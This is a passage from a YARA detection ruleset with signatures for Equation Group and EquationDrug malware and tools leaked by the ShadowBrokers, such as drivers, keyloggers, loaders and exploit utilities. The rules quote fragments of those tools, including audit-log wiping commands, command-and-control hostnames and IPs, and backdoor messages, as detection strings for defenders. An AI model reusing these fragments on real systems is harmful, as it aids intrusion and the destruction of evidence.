$x3 = "if ($line =~ /Reg_Dword:  (\\d\\d:\\d\\d:\\d\\d.\\d+ \\d+ - )?(\\S*)/) {" fullword ascii
$s1 = "if ($_ =~ /InstallDate/) {" fullword ascii
$s2 = "if (not($cmdInput)) {" fullword ascii
$s3 = "print \"$hex in decimal=$dec\\n\\n\";" fullword ascii
condition:
filesize < 2KB and ( 1 of ($x*) or 3 of them )
}
rule SSC_EQGRP_1212
{
meta:
description = "Detects tool from EQGRP toolset - file 1212.pl"
author = "Florian Roth"
reference = "Research"
date = "2016-08-15"
strings:
$s1 = "if (!(($srcip,$dstip,$srcport,$dstport) = ($line=~/^([a-f0-9]{8})([a-f0-9]{8})([a-f0-9]{4})([a-f0-9]{4})$/)))" fullword ascii
$s2 = "$ans=\"$srcip:$srcport -> $dstip:$dstport\";" fullword ascii
$s3 = "return \"ERROR:$line is not a valid port\";" fullword ascii
$s4 = "$dstport=hextoPort($dstport);" fullword ascii
$s5 = "sub hextoPort" fullword ascii
$s6 = "$byte_table{\"$chars[$sixteens]$chars[$ones]\"}=$i;" fullword ascii
condition:
filesize < 6KB and 4 of them
}
rule SSC_Equation_Kaspersky_EquationDrugInstaller
{
meta:
description = "Equation Group Malware - EquationDrug installer LUTEUSOBSTOS"
author = "Florian Roth"
reference = "http://goo.gl/ivt8EW"
date = "2015/02/16"
hash = "61fab1b8451275c7fd580895d9c68e152ff46417"
strings:
$mz = { 4d 5a }
$s0 = "\\system32\\win32k.sys" fullword wide
$s1 = "ALL_FIREWALLS" fullword ascii
$x1 = "@prkMtx" fullword wide
$x2 = "STATIC" fullword wide
$x3 = "windir" fullword wide
$x4 = "cnFormVoidFBC" fullword wide
$x5 = "CcnFormSyncExFBC" fullword wide
$x6 = "WinStaObj" fullword wide
$x7 = "BINRES" fullword wide
condition:
( $mz at 0 ) and filesize < 500000 and all of ($s*) and 5 of ($x*)
}
rule SSC_Equation_Kaspersky_EOP_Package
{
meta:
description = "Equation Group Malware - EoP package and malware launcher"
author = "Florian Roth"
reference = "http://goo.gl/ivt8EW"
date = "2015/02/16"
hash = "2bd1b1f5b4384ce802d5d32d8c8fd3d1dc04b962"
strings:
$mz = { 4d 5a }
$s0 = "abababababab" fullword ascii
$s1 = "abcdefghijklmnopq" fullword ascii
$s2 = "@STATIC" fullword wide
$s3 = "$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" fullword ascii
$s4 = "@prkMtx" fullword wide
$s5 = "prkMtx" fullword wide
$s6 = "cnFormVoidFBC" fullword wide
condition:
( $mz at 0 ) and filesize < 100000 and all of ($s*)
}
rule SSC_EquationDrug_FileSystem_Filter
{
meta:
description = "EquationDrug - Filesystem filter driver  volrec.sys, scsi2mgr.sys"
author = "Florian Roth @4nc4p"
reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
date = "2015/03/11"
hash = "57fa4a1abbf39f4899ea76543ebd3688dcc11e13"
strings:
$s0 = "volrec.sys" fullword wide
$s1 = "volrec.pdb" fullword ascii
$s2 = "Volume recognizer driver" fullword wide
condition:
all of them
}
rule SSC_EquationDrug_PlatformOrchestrator
{
meta:
description = "EquationDrug - Platform orchestrator - mscfg32.dll, svchost32.dll"
author = "Florian Roth @4nc4p"
reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
date = "2015/03/11"
hash = "febc4f30786db7804008dc9bc1cebdc26993e240"
strings:
$s0 = "SERVICES.EXE" fullword wide
$s1 = "\\command.com" fullword wide
$s2 = "Microsoft(R) Windows (TM) Operating System" fullword wide
$s3 = "LSASS.EXE" fullword wide
$s4 = "Windows Configuration Services" fullword wide
$s8 = "unilay.dll" fullword ascii
condition:
all of them
}
rule SSC_EquationDrug_NetworkSniffer2
{
meta:
description = "EquationDrug - Network Sniffer - tdip.sys"
author = "Florian Roth @4nc4p"
reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
date = "2015/03/11"
hash = "7e3cd36875c0e5ccb076eb74855d627ae8d4627f"
strings:
$s0 = "Microsoft(R) Windows (TM) Operating System" fullword wide
$s1 = "IP Transport Driver" fullword wide
$s2 = "tdip.sys" fullword wide
$s3 = "sys\\tdip.dbg" fullword ascii
$s4 = "dip.sys" fullword ascii
$s5 = "\\Device\\%ws_%ws" fullword wide
$s6 = "\\DosDevices\\%ws" fullword wide
$s7 = "\\Device\\%ws" fullword wide
condition:
all of them
}
rule SSC_EquationDrug_KernelRootkit
{
meta:
description = "EquationDrug - Kernel mode stage 0 and rootkit (Windows 2000 and above) - msndsrv.sys"
author = "Florian Roth @4nc4p"
reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
date = "2015/03/11"
hash = "597715224249e9fb77dc733b2e4d507f0cc41af6"
strings:
$s0 = "Microsoft(R) Windows (TM) Operating System" fullword wide
$s1 = "Parmsndsrv.dbg" fullword ascii
$s2 = "\\Registry\\User\\CurrentUser\\" fullword wide
$s3 = "msndsrv.sys" fullword wide
$s5 = "\\REGISTRY\\MACHINE\\System\\CurrentControlSet\\Control\\Windows" fullword wide
$s6 = "\\Device\\%ws_%ws" fullword wide
$s7 = "\\DosDevices\\%ws" fullword wide
$s9 = "\\Device\\%ws" fullword wide
condition:
all of them
}
rule SSC_Equation_Kaspersky_HDD_reprogramming_module
{
meta:
description = "Equation Group Malware - HDD reprogramming module"
author = "Florian Roth"
reference = "http://goo.gl/ivt8EW"
date = "2015/02/16"
hash = "ff2b50f371eb26f22eb8a2118e9ab0e015081500"
strings:
$mz = { 4d 5a }
$s0 = "nls_933w.dll" fullword ascii
$s1 = "BINARY" fullword wide
$s2 = "KfAcquireSpinLock" fullword ascii
$s3 = "HAL.dll" fullword ascii
$s4 = "READ_REGISTER_UCHAR" fullword ascii
condition:
( $mz at 0 ) and filesize < 300000 and all of ($s*)
}
rule SSC_apt_equation_exploitlib_mutexes
{
meta:
copyright = "Kaspersky Lab"
description = "Rule to detect Equation group's Exploitation library http://goo.gl/ivt8EW"
version = "1.0"
last_modified = "2015-02-16"
reference = "http://securelist.com/blog/research/68750/equation-the-death-star-of-malware-galaxy/"
strings:
$mz="MZ"
$a1="prkMtx" wide
$a2="cnFormSyncExFBC" wide
$a3="cnFormVoidFBC" wide
$a4="cnFormSyncExFBC"
$a5="cnFormVoidFBC"
condition:
(($mz at 0) and any of ($a*))
}
rule SSC_EquationDrug_Keylogger
{
meta:
description = "EquationDrug - Key/clipboard logger driver - msrtvd.sys"
author = "Florian Roth @4nc4p"
reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
date = "2015/03/11"
hash = "b93aa17b19575a6e4962d224c5801fb78e9a7bb5"
strings:
$s0 = "\\registry\\machine\\software\\Microsoft\\Windows NT\\CurrentVersion" fullword wide
$s2 = "\\registry\\machine\\SYSTEM\\ControlSet001\\Control\\Session Manager\\En" wide
$s3 = "\\DosDevices\\Gk" fullword wide
$s5 = "\\Device\\Gk0" fullword wide
condition:
all of them
}
rule SSC_apt_equation_keyword
{
meta:
description = "Rule to detect Equation group's keyword in executable file"
author = "Florian Roth @4nc4p"
last_modified = "2015-09-26"
reference = "http://securelist.com/blog/research/68750/equation-the-death-star-of-malware-galaxy/"
strings:
$a1 = "Backsnarf_AB25" wide
$a2 = "Backsnarf_AB25" ascii
condition:
uint16(0) == 0x5a4d and 1 of ($a*)
}
rule SSC_apt_equation_cryptotable
{
meta:
copyright = "Kaspersky Lab"
description = "Rule to detect the crypto library used in Equation group malware"
version = "1.0"
last_modified = "2015-02-16"
reference = "https://securelist.com/blog/"
strings:
$a={37 DF E8 B6 C7 9C 0B AE 91 EF F0 3B 90 C6 80 85 5D 19 4B 45 44 12 3C E2 0D 5C 1C 7B C4 FF D6 05 17 14 4F 03 74 1E 41 DA 8F 7D DE 7E 99 F1 35 AC B8 46 93 CE 23 82 07 EB 2B D4 72 71 40 F3 B0 F7 78 D7 4C D1 55 1A 39 83 18 FA E1 9A 56 B1 96 AB A6 30 C5 5F BE 0C 50 C1}
condition:
$a
}
rule SSC_apt_equation_doublefantasy_genericresource
{
meta:
copyright = "Kaspersky Lab"
description = "Rule to detect DoubleFantasy encoded config http://goo.gl/ivt8EW"
version = "1.0"
last_modified = "2015-02-16"
reference = "http://securelist.com/blog/research/68750/equation-the-death-star-of-malware-galaxy/"
strings:
$mz="MZ"
$a1={06 00 42 00 49 00 4E 00 52 00 45 00 53 00}
$a2="yyyyyyyyyyyyyyyy"
$a3="002"
condition:
(($mz at 0) and all of ($a*)) and filesize < 500000
}
rule SSC_Equation_Kaspersky_FannyWorm
{
meta:
description = "Equation Group Malware - Fanny Worm"
author = "Florian Roth"
reference = "http://goo.gl/ivt8EW"
date = "2015/02/16"
hash = "1f0ae54ac3f10d533013f74f48849de4e65817a7"
strings:
$mz = { 4d 5a }
$s1 = "x:\\fanny.bmp" fullword ascii
$s2 = "32.exe" fullword ascii
$s3 = "d:\\fanny.bmp" fullword ascii
$x1 = "c:\\windows\\system32\\kernel32.dll" fullword ascii
$x2 = "System\\CurrentControlSet\\Services\\USBSTOR\\Enum" fullword ascii
$x3 = "System\\CurrentControlSet\\Services\\PartMgr\\Enum" fullword ascii
$x4 = "\\system32\\win32k.sys" fullword wide
$x5 = "\\AGENTCPD.DLL" fullword ascii
$x6 = "agentcpd.dll" fullword ascii
$x7 = "PADupdate.exe" fullword ascii
$x8 = "dll_installer.dll" fullword ascii
$x9 = "\\restore\\" fullword ascii
$x10 = "Q:\\__?__.lnk" fullword ascii
$x11 = "Software\\Microsoft\\MSNetMng" fullword ascii
$x12 = "\\shelldoc.dll" fullword ascii
$x13 = "file size = %d bytes" fullword ascii
$x14 = "\\MSAgent" fullword ascii
$x15 = "Global\\RPCMutex" fullword ascii
$x16 = "Global\\DirectMarketing" fullword ascii
condition:
( $mz at 0 ) and filesize < 300000 and (( 2 of ($s*) ) or ( 1 of ($s*) and 6 of ($x*) ) or ( 14 of ($x*)))
}
rule SSC_Equation_Kaspersky_GreyFishInstaller
{
meta:
description = "Equation Group Malware - Grey Fish"
author = "Florian Roth"
reference = "http://goo.gl/ivt8EW"
date = "2015/02/16"
hash = "58d15d1581f32f36542f3e9fb4b1fc84d2a6ba35"
strings:
$s0 = "DOGROUND.exe" fullword wide
$s1 = "Windows Configuration Services" fullword wide
$s2 = "GetMappedFilenameW" fullword ascii
condition:
all of them
}
rule SSC_EquationDrug_NetworkSniffer5
{
meta:
description = "EquationDrug - Network-sniffer/patcher - atmdkdrv.sys"
author = "Florian Roth @4nc4p"
reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
date = "2015/03/11"
hash = "09399b9bd600d4516db37307a457bc55eedcbd17"
strings:
$s0 = "Microsoft(R) Windows (TM) Operating System" fullword wide
$s1 = "\\Registry\\User\\CurrentUser\\" fullword wide
$s2 = "atmdkdrv.sys" fullword wide
$s4 = "\\Device\\%ws_%ws" fullword wide
$s5 = "\\DosDevices\\%ws" fullword wide
$s6 = "\\Device\\%ws" fullword wide
condition:
all of them
}
rule SSC_Equation_Kaspersky_TripleFantasy_1
{
meta:
description = "Equation Group Malware - TripleFantasy http://goo.gl/ivt8EW"
author = "Florian Roth"
reference = "http://goo.gl/ivt8EW"
date = "2015/02/16"
hash = "b2b2cd9ca6f5864ef2ac6382b7b6374a9fb2cbe9"
strings:
$mz = { 4d 5a }
$s0 = "%SystemRoot%\\system32\\hnetcfg.dll" fullword wide
$s1 = "%WINDIR%\\System32\\ahlhcib.dll" fullword wide
$s2 = "%WINDIR%\\sjyntmv.dat" fullword wide
$s3 = "Global\\{8c38e4f3-591f-91cf-06a6-67b84d8a0102}" fullword wide
$s4 = "%WINDIR%\\System32\\owrwbsdi" fullword wide
$s5 = "Chrome" fullword wide
$s6 = "StringIndex" fullword ascii
$x1 = "itemagic.net@443" fullword wide
$x2 = "team4heat.net@443" fullword wide
$x5 = "62.216.152.69@443" fullword wide
$x6 = "84.233.205.37@443" fullword wide
$z1 = "www.microsoft.com@80" fullword wide
$z2 = "www.google.com@80" fullword wide
$z3 = "127.0.0.1:3128" fullword wide
condition:
( $mz at 0 ) and filesize < 300000 and (( all of ($s*) and all of ($z*) ) or ( all of ($s*) and 1 of ($x*) ))
}
rule SSC_EquationDrug_NetworkSniffer1
{
meta:
description = "EquationDrug - Backdoor driven by network sniffer - mstcp32.sys, fat32.sys"
author = "Florian Roth @4nc4p"
reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
date = "2015/03/11"
hash = "26e787997a338d8111d96c9a4c103cf8ff0201ce"
strings:
$s0 = "Microsoft(R) Windows (TM) Operating System" fullword wide
$s1 = "\\Registry\\User\\CurrentUser\\" fullword wide
$s3 = "sys\\mstcp32.dbg" fullword ascii
$s7 = "mstcp32.sys" fullword wide
$s8 = "p32.sys" fullword ascii
$s9 = "\\Device\\%ws_%ws" fullword wide
$s10 = "\\DosDevices\\%ws" fullword wide
$s11 = "\\Device\\%ws" fullword wide
condition:
all of them
}
rule SSC_EquationDrug_CompatLayer_UnilayDLL
{
meta:
description = "EquationDrug - Unilay.DLL"
author = "Florian Roth @4nc4p"
reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
date = "2015/03/11"
hash = "a3a31937956f161beba8acac35b96cb74241cd0f"
strings:
$mz = { 4d 5a }
$s0 = "unilay.dll" fullword ascii
condition:
( $mz at 0 ) and $s0
}
rule SSC_Equation_Kaspersky_DoubleFantasy_1
{
meta:
description = "Equation Group Malware - DoubleFantasy"
author = "Florian Roth"
reference = "http://goo.gl/ivt8EW"
date = "2015/02/16"
hash = "d09b4b6d3244ac382049736ca98d7de0c6787fa2"
strings:
$mz = { 4d 5a }
$z1 = "msvcp5%d.dll" fullword ascii
$s0 = "actxprxy.GetProxyDllInfo" fullword ascii
$s3 = "actxprxy.DllGetClassObject" fullword ascii
$s5 = "actxprxy.DllRegisterServer" fullword ascii
$s6 = "actxprxy.DllUnregisterServer" fullword ascii
$x1 = "yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy" ascii
$x2 = "191H1a1" fullword ascii
$x3 = "November " fullword ascii
$x4 = "abababababab" fullword ascii
$x5 = "January " fullword ascii
$x6 = "October " fullword ascii
$x7 = "September " fullword ascii
condition:
( $mz at 0 ) and filesize < 350000 and (( $z1 ) or ( all of ($s*) and 6 of ($x*) ))
}
rule SSC_EquationDrug_VolRec_Driver
{
meta:
description = "EquationDrug - Collector plugin for Volrec - msrstd.sys"
author = "Florian Roth @4nc4p"
reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
date = "2015/03/11"
hash = "ee2b504ad502dc3fed62d6483d93d9b1221cdd6c"
strings:
$s0 = "msrstd.sys" fullword wide
$s1 = "msrstd.pdb" fullword ascii
$s2 = "msrstd driver" fullword wide
condition:
all of them
}
rule SSC_EquationDrug_NetworkSniffer4
{
meta:
description = "EquationDrug - Network-sniffer/patcher - atmdkdrv.sys"
author = "Florian Roth @4nc4p"
reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
date = "2015/03/11"
hash = "cace40965f8600a24a2457f7792efba3bd84d9ba"
strings:
$s0 = "Copyright 1999 RAVISENT Technologies Inc." fullword wide
$s1 = "\\systemroot\\" fullword ascii
$s2 = "RAVISENT Technologies Inc." fullword wide
$s3 = "Created by VIONA Development" fullword wide
$s4 = "\\Registry\\User\\CurrentUser\\" fullword wide
$s5 = "\\device\\harddiskvolume" fullword wide
$s7 = "ATMDKDRV.SYS" fullword wide
$s8 = "\\Device\\%ws_%ws" fullword wide
$s9 = "\\DosDevices\\%ws" fullword wide
$s10 = "CineMaster C 1.1 WDM Main Driver" fullword wide
$s11 = "\\Device\\%ws" fullword wide
$s13 = "CineMaster C 1.1 WDM" fullword wide
condition:
all of them
}
rule SSC_EquationDrug_HDDSSD_Op
{
meta:
description = "EquationDrug - HDD/SSD firmware operation - nls_933w.dll"
author = "Florian Roth @4nc4p"
reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
date = "2015/03/11"
hash = "ff2b50f371eb26f22eb8a2118e9ab0e015081500"
strings:
$s0 = "nls_933w.dll" fullword ascii
condition:
all of them
}
rule SSC_apt_equation_equationlaser_runtimeclasses
{
meta:
copyright = "Kaspersky Lab"
description = "Rule to detect the EquationLaser malware"
version = "1.0"
last_modified = "2015-02-16"
reference = "https://securelist.com/blog/"
strings:
$a1="?a73957838_2@@YAXXZ"
$a2="?a84884@@YAXXZ"
$a3="?b823838_9839@@YAXXZ"
$a4="?e747383_94@@YAXXZ"
$a5="?e83834@@YAXXZ"
$a6="?e929348_827@@YAXXZ"
condition:
any of them
}
rule SSC_Equation_Kaspersky_EquationLaserInstaller
{
meta:
description = "Equation Group Malware - EquationLaser Installer"
author = "Florian Roth"
reference = "http://goo.gl/ivt8EW"
date = "2015/02/16"
hash = "5e1f56c1e57fbff96d4999db1fd6dd0f7d8221df"
strings:
$mz = { 4d 5a }
$s0 = "Failed to get Windows version" fullword ascii
$s1 = "lsasrv32.dll and lsass.exe" fullword wide
$s2 = "\\\\%s\\mailslot\\%s" fullword ascii
$s3 = "%d-%d-%d %d:%d:%d Z" fullword ascii
$s4 = "lsasrv32.dll" fullword ascii
$s5 = "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" fullword ascii
$s6 = "%s %02x %s" fullword ascii
$s7 = "VIEWERS" fullword ascii
$s8 = "5.2.3790.220 (srv03_gdr.040918-1552)" fullword wide
condition:
( $mz at 0 ) and filesize < 250000 and 6 of ($s*)
}
rule SSC_Equation_Kaspersky_GROK_Keylogger
{
meta:
description = "Equation Group Malware - GROK keylogger"
author = "Florian Roth"
reference = "http://goo.gl/ivt8EW"
date = "2015/02/16"
hash = "50b8f125ed33233a545a1aac3c9d4bb6aa34b48f"
strings:
$mz = { 4d 5a }
$s0 = "c:\\users\\rmgree5\\" ascii
$s1 = "msrtdv.sys" fullword wide
$x1 = "svrg.pdb" fullword ascii
$x2 = "W32pServiceTable" fullword ascii
$x3 = "In forma" fullword ascii
$x4 = "ReleaseF" fullword ascii
$x5 = "criptor" fullword ascii
$x6 = "astMutex" fullword ascii
$x7 = "ARASATAU" fullword ascii
$x8 = "R0omp4ar" fullword ascii
$z1 = "H.text" fullword ascii
$z2 = "\\registry\\machine\\software\\Microsoft\\Windows NT\\CurrentVersion" fullword wide
$z4 = "\\registry\\machine\\SYSTEM\\ControlSet001\\Control\\Session Manager\\Environment" wide fullword
condition:
( $mz at 0 ) and filesize < 250000 and ($s0 or ( $s1 and 6 of ($x*) ) or ( 6 of ($x*) and all of ($z*) ))
}
rule SSC_Equation_Kaspersky_TripleFantasy_Loader
{
meta:
description = "Equation Group Malware - TripleFantasy Loader"
author = "Florian Roth"
reference = "http://goo.gl/ivt8EW"
date = "2015/02/16"
hash = "4ce6e77a11b443cc7cbe439b71bf39a39d3d7fa3"
strings:
$mz = { 4d 5a }
$x1 = "Original Innovations, LLC" fullword wide
$x2 = "Moniter Resource Protocol" fullword wide
$x3 = "ahlhcib.dll" fullword wide
$s0 = "hnetcfg.HNetGetSharingServicesPage" fullword ascii
$s1 = "hnetcfg.IcfGetOperationalMode" fullword ascii
$s2 = "hnetcfg.IcfGetDynamicFwPorts" fullword ascii
$s3 = "hnetcfg.HNetFreeFirewallLoggingSettings" fullword ascii
$s4 = "hnetcfg.HNetGetShareAndBridgeSettings" fullword ascii
$s5 = "hnetcfg.HNetGetFirewallSettingsPage" fullword ascii
condition:
( $mz at 0 ) and filesize < 50000 and ( all of ($x*) and all of ($s*) )
}
rule SSC_EquationDrug_NetworkSniffer3
{
meta:
description = "EquationDrug - Network Sniffer - tdip.sys"
author = "Florian Roth @4nc4p"
reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
date = "2015/03/11"
hash = "14599516381a9646cd978cf962c4f92386371040"
strings:
$s0 = "Corporation. All rights reserved." fullword wide
$s1 = "IP Transport Driver" fullword wide
$s2 = "tdip.sys" fullword wide
$s3 = "tdip.pdb" fullword ascii
condition:
all of them
}
rule SSC_Equation_Kaspersky_SuspiciousString
{
meta:
description = "Equation Group Malware - suspicious string found in sample"
author = "Florian Roth"
reference = "http://goo.gl/ivt8EW"
date = "2015/02/17"
score = 60
strings:
$mz = { 4d 5a }
$s1 = "i386\\DesertWinterDriver.pdb" fullword
$s2 = "Performing UR-specific post-install..."
$s3 = "Timeout waiting for the \"canInstallNow\" event from the implant-specific EXE!"
$s4 = "STRAITSHOOTER30.exe"
$s5 = "standalonegrok_2.1.1.1"
$s6 = "c:\\users\\rmgree5\\"
condition:
( $mz at 0 ) and filesize < 500000 and all of ($s*)
}
rule SSC_EquationGroup_ys_ratload {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file ys.ratload.sh"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "a340e5b5cfd41076bd4d6ad89d7157eeac264db97a9dddaae15d935937f10d75"
strings:
$x1 = "echo \"example: ${0} -l 192.168.1.1 -p 22222 -x 9999\"" fullword ascii
$x2 = "-x [ port to start mini X server on DEFAULT = 12121 ]\"" fullword ascii
$x3 = "CALLBACK_PORT=32177" fullword ascii
condition:
( uint16(0) == 0x2123 and filesize < 3KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_ActiveDirectory_Target {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "33c1b7fdee7c70604be1e7baa9eea231164e62d5d5090ce7f807f43229fe5c36"
strings:
$s1 = "(&(objectCategory=person)(objectClass=user)(cn=" fullword wide
$s2 = "(&(objectClass=user)(objectCategory=person)" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}
rule SSC_EquationGroup_Auditcleaner {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file Auditcleaner"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "8c172a60fa9e50f0df493bf5baeb7cc311baef327431526c47114335e0097626"
strings:
$x1 = "> /var/log/audit/audit.log; rm -f ." ascii
$x2 = "Pastables to run on target:" ascii
$x3 = "cp /var/log/audit/audit.log .tmp" ascii
$l1 = "Here is the first good cron session from" fullword ascii
$l2 = "No need to clean LOGIN lines." fullword ascii
condition:
( filesize < 300KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17__ESKE_RPC2_8 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556"
hash2 = "5c0896dbafc5d8cc19b1bc7924420b20ed5999ac5bee2cb5a91aada0ea01e337"
strings:
$s4 = "Fragment: Packet too small to contain RPC header" fullword ascii
$s5 = "Fragment pickup: SmbNtReadX failed" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 700KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_DoubleFeatureDll_dll_3 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "515374423b8b132258bd91acf6f29168dcc267a3f45ecb9d1fe18ee3a253195b"
strings:
$a = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 }
$b = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 }
$c = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f }
condition:
( uint16(0) == 0x5a4d and filesize < 1000KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_PC_Exploit {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "77486bb828dba77099785feda0ca1d4f33ad0d39b672190079c508b3feb21fb0"
strings:
$s1 = "\\\\.\\pipe\\pcheap_reuse" fullword wide
$s2 = "**** FAILED TO DUPLICATE SOCKET ****" fullword wide
$s3 = "**** UNABLE TO DUPLICATE SOCKET TYPE %u ****" fullword wide
$s4 = "YOU CAN IGNORE ANY 'ServiceEntry returned error' messages after this..." fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 20KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_SetPorts {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "722d3cf03908629bc947c4cca7ce3d6b80590a04616f9df8f05c02de2d482fb2"
strings:
$s1 = "USAGE: SetPorts <input file> <output file> <version> <port1> [port2] [port3] [port4] [port5]" fullword ascii
$s2 = "Valid versions are:  1 = PC 1.2   2 = PC 1.2 (24 hour)" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 100KB and all of them )
}
rule SSC_EquationGroup_eh_1_1_0 {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file eh.1.1.0.0"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "0f8dd094516f1be96da5f9addc0f97bcac8f2a348374bd9631aa912344559628"
strings:
$x1 = "usage: %s -e -v -i target IP [-c Cert File] [-k Key File]" fullword ascii
$x2 = "TYPE=licxfer&ftp=%s&source=/var/home/ftp/pub&version=NA&licfile=" ascii
$x3 = "[-l Log File] [-m save MAC time file(s)] [-p Server Port]" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 100KB and 1 of them )
}
rule SSC_EquationGroup_pclean_v2_1_1_2 {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file pclean.v2.1.1.0-linux-i386"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "cdb5b1173e6eb32b5ea494c38764b9975ddfe83aa09ba0634c4bafa41d844c97"
strings:
$s3 = "** SIGNIFICANTLY IMPROVE PROCESSING TIME" fullword ascii
$s6 = "-c cmd_name:     strncmp() search for 1st %d chars of commands that " fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 40KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Eternalromance_2 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "f1ae9fdbb660aae3421fd3e5b626c1e537d8e9ee2f9cd6d56cb70b6878eaca5d"
hash2 = "b99c3cc1acbb085c9a895a8c3510f6daaf31f0d2d9ccb8477c7fb7119376f57b"
hash3 = "92c6a9e648bfd98bbceea3813ce96c6861487826d6b2c3d462debae73ed25b34"
strings:
$x1 = "[+] Backdoor shellcode written" fullword ascii
$x2 = "[*] Attempting exploit method %d" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 600KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17__EAFU_ecwi_ESKE_EVFR_RPC2_4 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "3e181ca31f1f75a6244b8e72afaa630171f182fbe907df4f8b656cc4a31602f6"
hash2 = "c4152f65e45ff327dade50f1ac3d3b876572a66c1ce03014f2877cea715d9afd"
hash3 = "9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556"
hash4 = "c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674"
hash5 = "5c0896dbafc5d8cc19b1bc7924420b20ed5999ac5bee2cb5a91aada0ea01e337"
strings:
$x1 = "* Listening Post DLL %s() returned error code %d." fullword ascii
$s1 = "WsaErrorTooManyProcesses" fullword ascii
$s2 = "NtErrorMoreProcessingRequired" fullword ascii
$s3 = "Connection closed by remote host (TCP Ack/Fin)" fullword ascii
$s4 = "ServerErrorBadNamePassword" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 2000KB and all of ($s*) or 1 of ($x*) )
}
rule SSC_EquationGroup__ftshell_ftshell_v3_10_3_0 {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- from files ftshell, ftshell.v3.10.3.7"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
super_rule = 1
hash1 = "9bebeb57f1c9254cb49976cc194da4be85da4eb94475cb8d813821fb0b24f893"
hash2 = "0be739024b41144c3b63e40e46bab22ac098ccab44ab2e268efc3b63aea02951"
strings:
$s1 = "set uRemoteUploadCommand \"[exec cat /current/.ourtn-ftshell-upcommand]\"" fullword ascii
$s2 = "send \"\\[ \\\"\\$BASH\\\" = \\\"/bin/bash\\\" -o \\\"\\$SHELL\\\" = \\\"/bin/bash\\\" \\] &&" ascii
$s3 = "system rm -f /current/tmp/ftshell.latest" fullword ascii
$s4 = "# ftshell -- File Transfer Shell" fullword ascii
condition:
( uint16(0) == 0x2123 and filesize < 100KB and 1 of them ) or ( 2 of them )
}
